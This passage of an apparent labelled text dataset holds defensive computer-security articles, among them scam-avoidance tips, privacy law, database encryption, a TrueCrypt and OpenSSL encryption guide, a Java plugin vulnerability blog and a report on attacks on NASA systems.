enormous.\"\nKnowing the threats you face online and the tools available to help you keep a watchful eye is critical in protecting yourself in the digital world. There are simple precautions that computer, mobile phone and other digital users can take to ensure their safety. Do not open emails/attachments from unknown or suspicious sources, nor answer email messages that ask for your personal information.\n\"The widows of Nigerian generals desperately seeking your financial assistance and notifications that you've won a European lottery are obvious scams but some email fraud can be much more difficult to distinguish,\" says Arabinda Banerjee, senior vice president of Technology Infrastructure at a leading bank in Tampa, Florida and faculty member at Argosy University, Tampa.\n\"In general, if it seems too good to be true or requires you to send money in to receive a reward, be sure to avoid it. Emails with vague but feel-good subject lines like 'Congratulations! ' or the name of a friend and the message 'has shared a picture/video ' can be malicious emails, even when apparently sent out by one of your friends.\" Do an Internet search using the term 'scam' and some of the key words from the message, advises Banerjee. If it's a known scam, you'll likely see it pop up in your search engine results.\nInvest in a good anti-virus software and firewall, the experts suggest. While this will not guarantee 100 percent protection, they will definitely reduce your risk greatly. Be sure that any WiFi connection you are using to conduct financial business is locked and protected and any stores you are making purchases from are reputable. In addition, be sure to monitor your financial accounts monthly to determine any fraudulent charges and report suspicious activity immediately.\nChange your passwords frequently and create passwords that are difficult to guess. Do not use the same ID/password in all websites. While keeping track of multiple logins and passwords may be an inconvenience, it's a necessary protection against hackers.", "label": 1}
{"text": "right of privacy: access to personal information\nThe right of privacy has evolved to protect the ability of individuals to determine what sort of information about themselves is collected, and how that information is used. Most commercial websites utilize \"cookies,\" as well as forms, to collect information from visitors such as name, address, email, demographic info, social security number, IP address, and financial information. In many cases, this information is then provided to third parties for marketing purposes. Other entities, such as the federal government and financial institutions, also collect personal information. The threats of fraud and identity theft created by this flow of personal information have been an impetus for right of privacy legislation requiring disclosure of information collection practices, opt-out opportunities, as well as internal protections of collected information. However, such requirements have yet to reach all segments of the marketplace.\n15 U.S.C. § 45 charges the Federal Trade Commission (FTC) with preventing \"unfair methods of competition in or affecting commerce and unfair or deceptive acts or practices in or affecting commerce.\" In matters of privacy, the FTC's role is one of enforcing privacy promises made in the marketplace. Several additional laws form the foundation on which the FTC carries out this charge: the Privacy Act of 1974 (5 U.S.C. § 552a), the Gramm-Leach-Bliley Act (15 U.S.C. §§ 6801-6809), the Fair Credit Reporting Act (15 U.S.C. § 1681 et seq.), and the Children's Online Privacy Protection Act (15 U.S.C. §§ 6501-6506).\nThe Privacy Act of 1974 (5 U.S.C. § 552a) protects personal information held by the federal government by preventing unauthorized disclosures of such information. Individuals also have the right to review such information, request corrections, and be informed of any disclosures. The Freedom of Information Act facilitates these processes.\nThe Fair Credit Reporting Act (15 U.S.C. § 1681 et seq.) protects personal financial information collected by consumer reporting agencies. The Act limits those who can access such infomation, and subsequent amendments have simplified the process by which consumers can obtain and correct the information collected about themselves. The FTC also actively enforces prohibitions on fraudulently obtaining personal financial information, a crime known as \"pretexting.\"\nThe Children's Online Privacy Protection Act (15 U.S.C. §§ 6501-6506) allows parents to control what information is collected about their child (younger than 13 years old) online. Operators of websites that either target children or knowingly collect personal information from children are required to post privacy policies, obtain parental consent before collecting information from children, allow parents to determine how such information is used, and provide the option to parents to opt-out of future collection from their child.\nHowever, despite the rights described above, other participants in the marketplace are not bound by law to develop similar protections and disclosure practices. Rather, in the remainder of the marketplace, the FTC encourages a voluntary regime of protecting consumer privacy. In two reports to Congress (1998, 2000) though, the FTC found that most sites falling outside of the jurisdiction of the established right of privacy laws do not adequately inform consumers about collection practices, nor do the majority of sites adequately protect the privacy of visitors' personal information. It appears that the voluntary regime is insufficient, and the prospect of further right of privacy legislation in the area of access to personal information is very real.", "label": 1}
{"text": "EasyLI Done! Series Tutorials\nAll EasyLI Done! Series Tutorials are designed to accomplish\nspecific tasks on a step-by-step basis!\ntwo computers together to share files using a crossover cable\nto setting up a secured\nwireless network connection, these online tutorials are extremely\neasy to follow. Although all tutorials were put together with the\nnovice user (beginner) in mind, advanced users will find a few tricks\nto put to use also, such as 'How\nto Force Windows to Shutdown' when it just won't shutdown normally.\nBefore downloading or using any content or\nsoftware on this site, please read the End User License Agreement\nDid you know? If you access the Internet without having a firewall\nturned on, your computer could be attacked by hackers, viruses,\nspyware and adware.\nYou should at least have a software-based firewall installed on\nyour computers and turned on, before making the connection to the\nInternet. The best Internet protection you can get for computers\nis a hardware-based firewall, also known as a router. Routers hide\nyour computers from the Internet by implementing network address\nFirewalls provide excellent protection against many viruses, adware,hackers,\nspyware and malware programs, by preventing those types of malicious\nprograms from being able to automatically download themselves from\nthe Internet onto computers. Malicious programs are able to infect\ncomputers that do not have a firewall installed on them, by scanning\nthe computers for open ports, and once an open port is found, the\nmalicious program automatically downloads itself onto that computer\nthrough that open port. Firewalls block open ports and prevent malicious\nprograms from being able to get into computers.\nDid you know? Firewalls can block you from accessing the Internet!\nFirewalls are great, but if not properly configured, they can cause\nmany problems. For instance, games that used to work fine begin\nto start crashing (freezing) the computer, problems sending and\nreceiving e-mail begin to surface, and problems viewing web pages\n('The page cannot be displayed...', 'Cannot find server...')\nIf you are experiencing problems after installing the McAfee\npersonal firewall plus, walkthrough the tutorial below and learn\nhow to configure the firewall so that it does not cause any further\nproblems on your computer or network of computers.\nFollow the steps below to configure the McAfee personal firewall", "label": 1}
{"text": "IT security is, generally, defined as a defensive approach to protect a company and its assets from unauthorized access by an intruder. IT security efforts include network security appliances, HoneyPots, robust authentication, limiting authorization to least necessary privileges, as well as other perimeter security defenses. However, these approaches do not provide definitive protection of the company's most valuable asset, its data, because a single intrusion could result in sensitive data being compromised. Additionally, in today's workplace culture the disgruntled employee may be as much of a threat as any external threat.\nData encryption is a direct response to internal and external security threats that may also meet compliance regulations. Encryption provides strong security for data \"at-rest\"; in our case, the data stored in the database, but to be effective should be implemented as a part of a broader security plan. There are many issues involved with the implementation of encryption, details that require decisions and actions to ensure the success of the implementation and the security of the data. This document will discuss the issues associated with database encryption implemented using SQL Server's native Transparent Database Encryption (TDE) mechanism.\nEncryption has been integral to human history beginning with the Babylonian use of Intaglio other historical examples include the Caesar Cipher, Scytale Transposition Cipher, Enigma, and even JimKryptos sculpture. Throughout history our society has enjoyed the ability to protect information using cryptographic methods including steganography, microdots, invisible ink, digital watermarks, and encryption which may be defined as the conversion of data so as to keep its meaning private. As the amount of sensitive data collected by commercial entities continues to grow the regulatory requirements for protecting the sensitive data will become more robust; meeting the regulatory requirements will necessarily require the continued use of data encryption methods.\nEncryption requires the application of an algorithm to transform the target data into a form that is unusable to anyone that does not have access to the encryption process used. In practical terms encryption applies a cryptographic algorithm with a \"key\" to the target data producing the encrypted form of the data which cannot be accessed without the key used to encrypt the data. The two primary forms of key encryption are symmetric and asymmetric which are distinguished by the number of keys used in the encryption / decryption process. Symmetric encryption uses a single key while asymmetric encryption uses a pair of keys generally referred to as public and private keys.\nWhile asymmetric encryption appears ideal for implementation because only the public key need ever be shared there are disadvantages with regard to performance. A sampling of asymmetric algorithms includes RSA, DSA, ELGamal, ECDSA, and XTR. Figure 1 demonstrates the asymmetric encryption process.\nFigure 1 Asymmetric Key Encryption / Decryption Process\nSymmetric algorithms require a single key for both encryption and decryption which allows for high-performance; however, with this approach the strength of the encryption is dependent on the security of the key. Common symmetric algorithms include AES/Rijndael, Blowfish, DES, Triple DES, Serpent, and IDEA to name only a few. Figure 2 demonstrates the symmetric encryption process.\nFigure 2 Symmetric Key Encryption Process\nBoth symmetric and asymmetric encryption approaches are vulnerable to brute force attacks and cryptanalysis. Brute force is an attack during which every possible permutation of the key value is attempted. Cryptanalysis, on the other hand, applies computational techniques to circumvent the encryption. In general, the use of sufficiently long keys will mitigate these attacks.\nIn summary, a symmetric key algorithm is fast but less secure than an asymmetric algorithm. Another approach is a hybrid wherein a symmetric key is used to encrypt the data while an asymmetric key is used to encrypt the symmetric key. It may be important to know in order to maintain perspective that there is only one encryption algorithm that is impossible to crack, One-Time Pad (OTP), any other algorithm may be broken given sufficient time and / or computer resources.\nSecurity concerns, in general, and encryption, specifically, are new concepts for most IT professionals; therefore, a Glossary of Security / Encryption Terms is included as an appendix for reference.\nOverview of Transparent Database Encryption\nThe primary benefit of Transparent Database Encryption (TDE) is the ability to encrypt data without affecting any application that uses the data while providing security for the entire database. TDE is implemented at the database-level, unlike cell-level encryption TDE does not require modification to applications or database column data types; furthermore, database-level encryption allows for higher performance than cell-level encryption. However, TDE may allow more data leakage because encrypted data is decrypted when read into the buffer pool; therefore, the data is not protected if the operating system writes data from memory to disk during paging operations, or during hibernation, or memory dumps, nor is the data protected while in memory.\nDatabase encryption is achieved by leveraging the Data Protection API (DPAPI) in Windows® which protects the Service Master Key (SMK) which protects the Database Master Key (DMK) which is used to protect the certificate or asymmetric keys which are used to protect the Database Encryption Key (DEK). These dependencies create a security chain from the operating system to the data eliminating user interaction thus strengthening security. The relationships and dependencies between keys is represented in Figure 3 below:\nFigure 3 SQL Server encryption key hierarchy with TDE and EKM (Source: BOL - http://msdn.microsoft.com/en-us/library/cc278098.aspx)\nThe hierarchy of keys in TDE is protected from the DPAPI to the DEK allowing the server to manage encryption and decryption automatically. The DMK and the certificate are stored in the MASTER database while the DEK is stored in the user database. This hierarchy and the key management chain provide TDE the capability to transparently encrypt and decrypt the database.\nThe process for encrypting a database is conceptually simple:\n- Create a Master Key\n- Obtain an Authentication Certificate\n- Create DEK\n- Enable TDE on the database\nHowever, significant complexity will be introduced if the database encryption strategy is undertaken without proper planning that addresses important implementation issues. Those issues are discussed in the following section.\nThe level of security necessary to protect the database should be documented during the planning phase. Individually and in combination the following encryption mechanisms are available to secure the database:\n- Encrypting File System (EFS)\n- Transparent Database Encryption (TDE)\nDiscussion of the benefits and performance implications of each mechanism and their combinations is beyond the scope of this paper.\nData encryption must address two equally important issues: encryption technology and cryptographic key (key) management. Encryption technology provides for variable granularity of data protection, performance, and integration with existing applications, as well as ease of implementation and management. However, the success of the selected encryption strategy may depend most on key management policies and processes. Key management issues include: key access, key storage, and cryptographic algorithm. Key management is one of many important issues that must be considered when planning the encryption project.\nThe important issues to consider during the planning phase of the encryption project are listed below:\n- Encryption Algorithm : DES, Triple DES, TRIPLE_DES_3KEY, RC2, RC4, 128-bit RC4, DESX, 128-bit AES, 192-bit AES, and 256-bit AES\n- Key Management : Key Storage, Hardware Security Module (HSM), Key Scheduling, Key Availability / Mobility / Security\n- Performance Impact. Encryption / Decryption - Microsoft claims 3-5%; however, independent tests indicate 6-12%..\n- TempDB Encryption - Encryption of any one DB will encrypt TempDB.\n- Transaction Log is encrypted.\n- Log Shipping Implementation Changes - Encrypted database log shipping requires the recipient database to possess the key in order to apply the logs.\n- Backup and Recovery Plan Changes - Encrypted databases cannot be recovered to a different instance without the key.\n- Disaster Recovery Plan Changes - Encrypted databases cannot be recovered to a different instance without the key.\n- Increased Disk Space Requirements - No SQL Server native backup compression. Third party tools may be available; however, in general, encrypted data cannot be significantly compressed.\n- TDE operates during I/O; therefore, any data written to disk outside of the buffer pool is not protected\n- No Support for FILESTREAM data-type\nThe diagram in Figure 4 represents a nominal encryption project planning process with each major area of consideration represented. The end result of the planning process is to produce a document detailing the decisions made that address the issues related to encrypting the database.\nFigure 4 Encryption Planning Process\nA comprehensive IT security policy provides a layered defense against threats to the system. However, even the most thorough perimeter network and physical defenses do not obviate the vulnerability of plaintext data stored in databases. Data encryption provides a means to protect sensitive data from unauthorized access as a part of a coordinated IT security policy that includes network security, robust authentication and authorization, as well as other physical security considerations. SQL Server and Windows® provide several mechanisms for the protection of data either at the file, database, or data levels.\nTransparent database encryption (TDE) is a new technology available in SQL Server 2008 Enterprise Edition which provides a simplified the data encryption option. TDE is a database-level encryption mechanism that reduces the implementation complexity by negating the need to modify the data and / or the client applications. However, the benefits of performance and simplicity are balanced by TDE's potential for data leakage; therefore, for the most sensitive data TDE alone may not suffice as a data security strategy.\nAny data protection strategy must weigh the costs and benefits of implementation to arrive at a usable solution that meets the security requirements defined by the business. TDE's protection of sensitive data in low to moderate threat environments may be sufficient for some business requirements while highly sensitive data or data in high threat environments will require the combination of TDE with other encryption mechanisms such as cell-level encryption, EFS, or BitLocker.", "label": 1}
{"text": "One of the most important rules in computer security is Don't open e-mail attachments.\nBut recently, we've seen more malicious links in e-mail messages. These links might look genuine, but they could be forged.\nHere are some tips to help you make the most of your e-mail without compromising security.\nDon't trust the sender information in an e-mail messageEven if the e-mail message appears to come from a sender that you know and trust, use the same precautions that you would use with any other e-mail message.\nFraudsters can easily spoof the identity information in an e-mail message.\nRead before you click\nA link in an e-mail message might promise to take you to site A, but will actually take you to site B.\nMost e-mail programs (such as Outlook 2007) show you the real target address, or URL, of a link when you hover the mouse over the link.\nBefore you click a link, make sure to read the target address. If the e-mail message appears to come from your bank, but the target address is just a meaningless series of numbers, do not click the link.\nMake sure that the spelling of words in the link matches what you expect. Fraudsters often use URLs with typos in them that are easy to overlook, such as \"micosoft.\" For more tips, see Recognize phishing scams and fraudulent e-mails.\nVerify the identity of the site\nSome sites feature verified identity information. When you visit a verified site using Internet Explorer 7, the browser address bar turns green and the identity information appears on the right-hand side of the address bar. This makes it easy to check the identity information and ensure that it matches the site that you expected to see.\nUse an updated browserRegularly updated Web browsers like Internet Explorer 7 incorporate an ever-expanding set of features, such as the Microsoft Phishing Filter, designed to help protect you when you click links in e-mail messages.\nIs it too good to be true?If a deal or offer in an e-mail message looks too good to be true, it probably is. Exercise common your common sense when you read and respond to e-mail messages.\nTo upgrade to Internet Explorer 7 now, visit www.microsoft.com/ie.", "label": 1}
{"text": "How to Avoid Being a Victim of Identity Theft, Online Fraud\nIdentity theft and online fraud are two of the fastest-growing crimes in the nation. These crimes can rob you of your money, time, and peace of mind.\nTypically, these crimes happen on the Internet where a criminal steals an individual's personal information like his Social Security Number or password, and uses these to commit fraud and other crimes.\nThese crimes are particularly harmful as the crime can be ongoing and happen over a long period of time before you actually become aware. In addition, identity thieves and online frauds may access all of your personal information, giving them the potential to wipe you out.\nThe best way to fight identity theft is to prevent it from happening in the first place. Keep the following three tips in mind on how to avoid being a victim of identity theft or online fraud.\n1. Keep your personal records safe. While identity theft and fraud generally happen online, you may also be robbed of your identity offline. Prior to the Internet, many criminals would dumpster dive and look for your sensitive information in the garbage. This still happens. So keep your personal information secure in your home such as in a safe or locked drawer. If you must dispose of such information, you should shred it first.\n2. Use a password that is unique. \"Password\" and \"MyPassword1234\" are easy to remember, but hardly unique. Other passwords to avoid are pet's names, phone numbers, birthdays, and anything else easily guessed. Also, you should avoid using the same password for all your accounts. This way, if one password is compromised, some of your accounts will be unaffected.\n3. Don't give out personal information over the phone. There are many scammers that are attempting to use telephone calls to get personal information. These phone calls will often sound official, such as a department store’s credit department calling in order to get payment. Typically, legitimate businesses will not require anything too personal over the phone.\n- Identity Theft (FindLaw)\n- Detecting Identity Theft: Has Someone Stolen Your Identity? (FindLaw's Common Law)\n- IRS Trash Puts Consumers at Risk of Identity Theft, Report Finds (FindLaw's Common Law)", "label": 1}
{"text": "A bit of gyan (knowledge)\nThe internet is maturing at an extremely fast rate day-by-day, and the world-wide-web (www) has become a central hub for information available worldwide. Nowadays, communication between the far ends of the world has become trivial. The dot-com boom happened in the mid-1990′s and companies have started depending hugely on the internet since then. This has paved way to a huge number of possibilities, along with risks. Companies and customers and retailers can buy and sell online and e-commerce has become substantially important because of this.\nWhat I’ve found is that however fast technology grows, people’s minds don’t change. No matter how secure you tend to keep your transaction between the client and server, e-commerce’s growth has not increased very much because of the constant fear in people’s minds – “How can I trust this fellow when I cannot even see him? What if I pay online but don’t get my package?”. A typical example is the huge number of credit card frauds over the decades, which has just increased the fear in people’s minds.\nEach time a vulnerability is discovered on a particular website, it has been exploited and has incurred huge losses for the company hosting that website. Time and again, people have tried to keep websites as secure as possible. Theoretically, algorithms (used in security) have been proven to be secure (till date) and yet, attackers have always found ways and means to breach security.\nIn my opinion, it is just plain ignorance of the designer to ignore the security aspects to make his work easier. Though development of technology is rapidly increasing and we learn new things everyday, secure coding practices are not learnt in the process. This in turn leads to security holes in the implementation of software, which are then exploited by attackers causing huge losses to companies.\nLet’s try to answer some simple questions:\n- How do you host webpages over the world-wide-web?\n- In most cases, web pages are accessed using the http(s) or (s)ftp protocols. If a person wants to host a website over the world-wide-web, (s)he has to first register his/her domain name. This means that the domain name will get mapped to a particular IP address which is reachable from anywhere in the world (called as ‘public ip’). Next, the person has to enable the website to be accessible from the machine having the assigned IP address, which is generally done using a web server to host his/her website. Now, the website is available to anyone who either knows the public IP or the registered domain name.\n- What programming language can be used while implementing the same?\n- There are a huge number of scripting languages available, which designers can use to create websites. Examples are PHP, JSP, ASP, etc. Programming constructs differ in each language, but end up doing the same things. There is also CGI (common gateway interface) where you can use scripting languages such as Python, Perl, Ruby, etc. to do the same job.\n- What should one do to make my web application secure?\n- This question cannot be answered in one paragraph. Anyway, I’ll try listing a few:\n- Firstly, it requires a good knowledge of the exact working of the code which designers write. Talking with an example, it means that knowing that “strcpy()” function copies one string to another is not enough, but rather the programmer needs to know how exactly it copies and why it is made so.\n- Secondly, the programmer who implements the software needs to have deep knowledge about secure coding practices – what, why and how. Secure coding practices try to ensure that there are minimal security holes in software being designed, thus ensuring safety, security and stability of software. Other factors such as reliability, integrity tag along if these conditions are met.\nNow, based on the three questions answered above, we can come to a standpoint as to what factors determine how secure a website is. In decreasing order of importance and difficulty:\n- Knowledge of the programmer.\n- Network layout being used.\n- Configurations being used in software.\nWe know that the only way to access a website hosted on a public IP is through the internet. Without the internet, the world-wide-web becomes a big joke. When we look at how the internet is designed, we see that networking plays a huge role. Hence, the protocols being implemented during transfer of data have to be secure. No matter how secure the application is, if the networking protocols being implemented are insecure, security is threatened. This is one basic fact that all web designers have to understand. Most of the devices used in the internet today, use the 5 layer hybrid protocol stack. This protocol stack is known to be insecure, and is prone to MITM attacks (DNS cache poisoning, ARP spoofing, IP spoofing, etc.)\nManagement of a website is normally done through configuration settings. These configuration settings determine how users of the website can access data and with what level of permissions. These configuration settings for the website can be divided into two parts – configurations of web server and the configurations of the user who is accessing the website. Configurations of the web server mean those configurations which affect all users accessing the website, whereas user-specific configurations apply to single users accessing the website. An example of a web-server configuration is the “Directory Listing” option, where a user can list the contents of a directory accessible through the website, without a webpage displaying it. An example of a user-specific configuration is the access control being specified to each user, controlled by an ACL (Access Control List). Programming languages sometimes influence how these user-specific configurations are specified.\nCan we make the world-wide-web ‘entirely’ secure?\nA simple answer would be “Entirely secure?! I don’t think so!”. But there are a lot of factors to consider while answering this question. Let’s look at some of them.\nFirstly, the programmer implementing the software has a good knowledge of secure coding practices. He/she has to know exactly how the code is being implemented and how secure it is. This is where programming languages play an important role. Some programming languages provide very high-level programming constructs to make the job easier for the programmer, but this actually blinds the programmer from the inner implementation of the constructs and how secure they are. Thus security does not only rely on how the the programmer codes, but also how the code is being implemented by the compiler/interpreter of that particular programming language. The programmer has to take care of this, carefully considering the programming language that is being used and how it is actually being implemented.\nThere isn’t much that can be done about the security level of the entire protocol stack. This is because if we have to modify the protocols in the protocol stack to make it secure (below the application layer), then we would have to change the firmware in every hub, switch, router and computer all around the world. For a long time, people have been changing the protocols at the application layer to secure ones (such as SSL), trying to prevent MITM attacks at the application layer. But then we have to understand that whatever is done on the application layer is specific only to that layer. The security mechanisms used in the application layer are totally blind to attacks happening at the lower layers. Thus, if we actually would have to make the network layout totally secure, that wouldn’t be possible. But what we can do is to provide more encryption mechanisms at the application layer, hoping for the best. So from the network point of view, the world-wide-web is still insecure and will continue to be until the entire protocol stack can be made secure.\nIn most of today’s websites, vulnerabilities arise due to insecure configurations being used. The programmer is lazy, thus leaving insecure configurations on the website, paving way for information leak and potential exploits. Though this is relatively easier to handle when compared to the other factors, it is important when it comes to security of a website.\nThe very need of security arises because of the fact – all of us are not responsible citizens. There would be no need for policemen if there were no thieves. But this is definitely not achievable, because changing hardware and software is a lot easier than changing people! There is a reason that I’ve said that “knowledge of the programmer” is more important and harder to achieve than “making the network layout secure”. What I mean is that it is easier to change all the hubs, switches, routers and computers all over the world to achieve security, than to strive to achieve that every programmer has to have the knowledge of secure coding practices!\nDuring my under-graduation, a professor had once said “It is a never-ending race between designers, attackers and security experts”. Designers keep developing technology, while attackers keep finding security holes in the implementation of that technology, and security experts try to come up with workarounds to patch these holes. This seems to be true, not only with computers, but with any technology used in this world!\nWe have to do best with what we have. We know that there are attackers prowling in the wild, looking for vulnerable websites to deface, or probably steal data from. So it is our responsibility to secure our data, no matter what. We have talked about some of the factors influencing security, so we will have to look deeper into the same and try to come up with an effective, yet secure implementation.", "label": 1}
{"text": "by Gina Trapani\nEveryone's got files they'd like to keep out the the hands of intruders or casual passerby. Ever concerned you'll lose the thumb drive where you backed up four years of post-graduate research? Every worried your 5-year-old will accidentally open the um, grownup files just meant for Mommy and Daddy? Worry no more. Today we'll go over a simple way to encrypt sensitive files or entire external disk drives to protect them from prying eyes.\nRecently-featured TrueCrypt is a free, open source encryption application that works on Windows and Linux. Given the right credentials, TrueCrypt will create a virtual hard drive that will read and write encrypted files on the fly. Huh-wha? Fear not; this'll make sense once we get it set up. Let's get started.\nSet up the encrypted volume location\n- Download TrueCrypt, install and launch.\n- Hit the \"Create Volume\" button to launch the wizard that prepares the encrypted drive location. Choose \"Create a Standard TrueCrypt Volume\" and hit Next. Hit the \"Select File\" button and navigate to a location to store your encrypted files and type a name for it. I'm going with \"C:\\Documents and Settings\\gina\\My Documents\\gtrapani.4meonly\" as shown. (Click to enlarge.)\n(That .4meonly extension is my own creation; your file can have any - or no - extension.) Keep in mind that this isn't the file you want to encrypt; it's a big file container that will store the files you want encrypted all scrambled up like eggs inside it. Hit Next.\n- Choose your encryption algorithm. The curious can flip through the dropdown and view info on each option, but you pretty much can't go wrong here; the default AES selection will work for most purposes. (Hey, if it works for Top Secret government files, it probably will work for you.) Hit Next. Choose the size of the virtual drive - for example, 100MB, as shown. (Click to enlarge.)\nYes, it's a pain to have to commit to a size beforehand, but the advantage here is that the file will always look like it's exactly 100MB, giving no hint to the actual size of its contents. Hit Next.\n- Choose your volume password. TrueCrypt wants something totally badass, like 20 characters with letters and numbers mixed together, something hard to crack. The whole point here is to keep snoopers at bay, so make your password reasonably difficult to crack or guess.\n- Format the \"volume.\" This part is cool: TrueCrypt gathers random information from your system - including the location of your mouse pointer - to format the file drive location with random data to make it impossible to read. Hit the Format button to go ahead with this operation, which may slow down your computer for a few seconds. (And don't be scared by the word \"Format\"; you're not erasing your hard drives or anything, you're just formatting the drive location file - in this example, the gtrapani.4meonly file - you just created.)\nCongrats! Your encrypted volume location is ready for use.\nStore and retrieve files from the encrypted volume\nNow you've got a TrueCrypt file that can hold all your highly-sensitive data files locked up tight as a drum. Here's how to get to it.\n- From TrueCrypt, choose \"Select File\" and navigate to the volume file you created above, as shown. (Click to enlarge.)\n- Select an available drive letter from the list in TrueCrypt, like Z:. Hit the \"Mount\" button, and enter the volume password you created above.\n- If you enter the correct password, the virtual drive Z: will be mounted. Go to My Computer and listed alongside all the other drives on your computer, there will be a new one listed \"Local Disk Z:.\" Drag and drop all your sensitive data to this drive and work from it as if you would any other disk.\n- Once you're finished working with the data, in TrueCrypt, select the mounted drive (like Z:) and hit the \"Dismount\" button. The Z: drive will no longer be available, and all you'll have left is the gtrapani.4meonly file you created, which can be dropped onto a thumb drive, emailed to yourself, burned to CD or placed on your iPod, totally encrypted.\nNote: Using TrueCrypt you can secure an entire drive - like a USB thumb drive. To do so, instead of hitting \"Select File,\" use \"Select Device\" and choose your thumb drive.\nAlternate Method: OpenSSL\nThe downside to TrueCrypt is that\nit has to be installed everywhere you want to access the passworded files, and it's not compatible with Mac OS X. (Note: Reader pmhesse says you can carry around the TrueCrypt files on a thumb drive and use it from there instead of installing the whole app on every computer you need it.)\nFor those of you comfortable on the command line, there's an alternative way to password a file using the free utility OpenSSL. Say you want to password protect a tar archive of documents called unencrypted-data.tar.\nFrom the command line, type:\n$ openssl des3 -salt -in unencrypted-data.tar -out encrypted-data.tar.des3 enter des-ede3-cbc encryption password: Verifying - enter des-ede3-cbc encryption password: $\nThat command will encrypt the unencrypted-data.tar file with the password you choose and output the result to encrypted-data.tar.des3. To unlock the encrypted file, use the following command:\n$ openssl des3 -d -salt -in encrypted-data.tar.des3 -out unencrypted-data.tar enter des-ede3-cbc encryption password: $\nThis method works with Cygwin on Windows, OS X and Linux.\nHow do you keep your sensitive files from getting into the wrong hands? Let us know in the comments or to tips at lifehacker.com.\nGina Trapani, the editor of Lifehacker, is currently encrypting all the terrible poetry and humiliating love stories she's ever written. Her semi-weekly feature, Geek to Live, appears every Wednesday and Friday on Lifehacker. Subscribe to the Geek to Live feed to get new installments in your newsreader.", "label": 1}
{"text": "It is very common to confuse cloud computing with virtualization. Since they are both relatively new and since organizations are calling it the saving face of new age technology, I assumed we might want to look into what exactly the two technologies are and how diverse they are from each other.\nCloud is essentially a highly scalable platform where you can store data, build and run applications that can be accessed through the internet only. Cloud is a mode to mobilize all applications so that you can remotely access your organization data through any device that has access to internet. Data center hosts or collocation hosts who are interested in cloud technology provide software as a service packages to their clients. Cloud makes it possible to have your servers in a secure environment in any part of the world and your clients still can access and modify the data if they have required security clearance. Cloud makes use of virtualized resources in order to fulfill its requirements. A cloud host provides hardware and hosting facilities depending on the usage requested by the client.\nVirtualization, on the other hand, is a technique of creating a virtual pool of servers, operating systems, storage devices and network resources. It enables a single user to access multiple physical devices at the same time. With this, one operating system can control the operation of multiple computers or vice versa.\nBuilding your own data center takes a lot of capital investment; and maintaining it is a nightmare you do not want to go through if your main aim is to focus on your business. Hiring a service is a better option. Unlike the cloud, in a data center, you have to note that you will merely be storing your servers on someone else’s property. So you are responsible for upgrading your servers as and when technology takes a giant leap. The drawback with data centers is the challenge you will face while scaling up as and when the need arises. Your data center host must have rack space to accommodate an extra server or two and also must be equipped to handle an increase in cooling and power needs. Of course, there is a problem of your resources going on standby mode when not in use, too. Cloud may be an ideal solution from an economic point of view. Like we have mentioned before, you only pay for the services you are using; not for idle or standby services.\nVirtualization is all about the control. Pure, unparalleled control over multiple devices using a single point of operation. With virtualization, for instance, you can run a very large application even though your system individually cannot support it. In other words, your system interacts with the other systems connected to the virtualization network, notes which system is available and uses part of the available system’s resources in addition to your own to run your application. It’s like your system has temporarily expanded its capacity to run your application successfully.\nThrough virtualization, you can install a software only once and be rest assured that everyone will have access to it. You don’t need multiple licences to make the software available to all your employees. Since you are technically installing it only on one system, you are not violating any laws either. Same is true with storage. This technique avoids the need for data replication, thus saving storage space.\nSo you see, one technology has nothing to do with the other; and they, most certainly, are not the same thing. Virtualization, to an extent, makes the cloud operable.\nData Center Talk updates its resources everyday. Visit us to know of the latest technology and standards from the data center world.\nPlease leave your views and comments on DCT Forum.", "label": 1}
{"text": "Once Again: Java Vulnerability\nIn light of the recent set of vulnerabilities found within the Java SE 7 browser plugin, I've read stories and heard from people who are completely uninstalling Java from their computers. In my opinion, this is an over-reaction to an issue that affects only one thing: the Java plugin for the browser. This is used only to run Java Applets or Java WebStart to launch applications via the browser. Considering there are three other types of Java applications that are unaffected (Java Embedded applications, Java SE desktop applications, and Java EE web-based or enterprise applications), this is only a small portion of the Java world. On top of that, there honestly aren't many Java applets in use these days, so the need to use the Java plugin is minimal.\n- IDC Analyst Connection: Using Blade Systems to Cut Costs and Sharpen Efficiencies\n- Application Testing Strategies in the IBM z/OS Environment\n- Strategy: How to Conduct an Effective IT Security Risk Assessment\n- Strategy: Smartphone Smackdown: Galaxy Note II vs. Lumia 920 vs. iPhone 5\n- The Untapped Potential of Mobile Apps for Commercial Customers\n- Why is Information Governance So Important for Modern Analytics?\nTo be clear, these specific vulnerabilities don't affect real-world server-side deployments (Java EE), or even Java SE desktop applications such as Eclipse or Netbeans, JavaFX, Swing, and so on. There really is no need to uninstall the JDK or JRE. Users need only disable the Java plugin in their browser.\nOne point I've been trying to make to friends and colleagues, beginning with the previous rash of vulnerabilities (see my previous blog), is that this is only an issue if the user browses to a malicious web site. Java or no Java, pointing your browser to a malicious web site is dangerous and leaves you vulnerable either way. You could raise the point that even a legitimate site can get hacked, and a Java zero-day attack launched from it. However, I would add that if a site got hacked, you're still open to vulnerability with or without the Java plugin enabled.\nOracle's Java SE 7 update 11, released to address this issue, included a description of the issue and resolution. In summary, the change included a control panel setting to block unsigned Java applets from running automatically. I've heard that only one of the two vulnerabilities discovered this week has really been patched, and I've also just read that an even newer vulnerability has been found. If this is true, it could spark a big change for the Java browser plugin design.\nEither way, this doesn't mean that Java is an insecure language or platform, or that web sites built on Java EE are any less secure than other platforms. Unfortunately, perception often beats reality, and Java is getting a big black eye from this one. Hopefully Oracle can do more than just release updates to patch the vulnerabilities. They need to launch a campaign that explains the differences, as well as take steps to stop these vulnerabilities more effectively.", "label": 1}
{"text": "NASA Cyber Attacks On The Increase: Report\nAccording to NASA (the National Aeronautics and Space Administration), in recent years, it has become an increasingly popular target for high-tech hackers.\nIn 2007 and 2008, China was suspected to have hacked into NASA satellites, though no formal evidence linking China to the attacks has been brought forward.\nThe agency says its systems were hacked approximately thirteen times in 2011 alone.\n\"The threat to NASA's information security is persistent and ever-changing,\" noted Congressman Paul Braun at a recent meeting of the House Science, Space and Technology subcommittee.\n\"Unless NASA is able to continuously innovate and adapt, their data systems and operations will continue to be in danger.\" (Source: usatoday.com)\nNature of Attacks Varies Widely\nThe number of hacker infiltrations into NASA data systems continues to grow.\nSince 2010, for example, there have been a variety of startling breaches of NASA's security networks.\nThese include such issues as interference with Earth observation satellites Terra and Landsat-7, and the cyber theft of personal records associated with 150 NASA employees.\nIn a separate attack, hackers gained access to the personal records of those associated with NASA's Jet Propulsion Lab, located in Pasadena, California.\nThen there was the very public case of a Texas man who last year plead guilty to hacking NASA computers and then preventing the agency's workers from accessing important oceanographic information.\nNASA Too Big for Security Budget?\nThe problem with lack of security appears to be associated with NASA's enormous organizational 